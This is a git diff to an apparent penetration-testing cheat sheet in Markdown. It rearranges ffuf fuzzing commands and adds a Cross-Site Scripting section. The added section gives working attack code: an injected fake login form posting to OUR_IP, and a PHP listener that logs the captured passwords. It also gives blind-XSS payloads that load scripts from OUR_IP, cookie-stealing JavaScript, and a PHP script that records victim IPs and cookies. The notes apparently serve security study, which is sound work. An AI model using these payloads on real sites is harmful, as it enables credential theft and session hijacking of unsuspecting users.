@@ -553,6 +553,22 @@ To increase the speed of `ffuf` we can increase the number of threads with the `
 $ ffuf -w <SNIP> -u <SNIP> -t 200
 ```
 
+### Subdomain Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/
+```
+
+### Vhost Fuzzing
+
+```shell
+$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx
+```
+```
+*(-H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon
+  -fs xxx                     = filter all incorrect results)
+```
+
 ### Directory Fuzzing
 
 With the `-w` flag we can pass our wordlist, with `-u` the URL we want to fuzz. 
@@ -579,6 +595,7 @@ $ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u ht
 
 ### Recursive Fuzzing
 
+If there are several file extensions to check, we need to separate them with a '`,`'. Like this: `-e .php,.php7,.phps`.
 ```shell
 $ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
 ```
@@ -587,22 +604,6 @@ $ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u ht
   -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
   -e .php                 = specify the extension
   -v                      = output the full URLs)
-```
-
-### Subdomain Fuzzing
-
-```shell
-$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/
-```
-
-### Vhost Fuzzing
-
-```shell
-$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx
-```
-```
-*(-H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon
-  -fs xxx                     = filter all incorrect results)
 ```
 
 ### Parameter Fuzzing
@@ -739,6 +740,156 @@ There are three relevant commands, when it comes to `SMTP`:
 ```
 For further information see the following documentation: 
 [offensive-security.com](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
+
+### Cross-Site Scripting (XSS)
+
+Check malicious code against any input fields & HTTP-Header(i.e., when their values are displayed on the page) on a webpage.
+
+#### XSS Discovery
+##### Automated Discovery
+
+Tools:
+  1. [Nessus](https://www.tenable.com/products/nessus)
+  2. [Burp Pro](https://portswigger.net/burp/pro)
+  3. [ZAP](https://owasp.org/www-project-zap/)
+  4. [XSS Strike](https://github.com/s0md3v/XSStrike)
+  5. [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
+  6. [XSSer](https://github.com/epsylon/xsser)
+
+##### Manual Discovery
+###### XSS Payload
+
+1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+2. [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+
+#### Defacing Elements
+
+- Background Color `document.body.style.background`
+- Background `document.body.background`
+- Page Title `document.title`
+- Page Text `DOM.innerHTML`
+
+#### Phishing
+##### Login From Injection
+```js
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+##### Cleaning Up
+If there are Elements we won't have on the webpage anymore, we can remove them with the following code:
+
+```js
+document.getElementById('urlform').remove();
+```
+
+##### Credential Stealing
+
+```shell
+$ mkdir /tmp/tmpserver
+$ cd /tmp/tmpserver
+$ vi index.php #at this step we wrote our index.php file
+$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+#### Session Hijacking
+##### Blind XSS Detection
+
+A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
+
+Can be found at:
+  - Contact Forms
+  - Reviews
+  - User Details
+  - Support Tickets
+  - HTTP User-Agent header
+
+##### Loading a Remote Script
+
+Since we can't see how the website processes the output, we need to find a way to get this information. Therefor we can load remote scripts from a machine of our choice, which is under our control. 
+
+To identify the vulnerable target, we can use a suitable name for our requests. If we have an input filed which requires a username, we could generate a request for `/username`:
+```html
+<script src="http://OUR_IP/username"></script>
+```
+
+Some more examples:
+```html
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+Also have a look in the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) Project.
+
+In order to handle the requests, we need to start a listener on our machine:
+```shell
+$ mkdir /tmp/tmpserver
+$ cd /tmp/tmpserver
+$ vi index.php #at this step we wrote our index.php file
+$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+
+##### Session Hijacking
+
+Now that we know where we should place our vulnerable payload and the fitting payload itself too, we first need to create a script to resolve our xss request. For example one of the following:
+```js
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+Once done we can use our .php file from the section above again. But we need to adjust it a bit:
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+Let's start our listener:
+```shell
+$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+Now we can place our early discovered payload again, but this time we request the `/script.js`.
+```html
+<script src=http://OUR_IP/script.js></script>
+```
 
 ### SQL injection
 #### Types
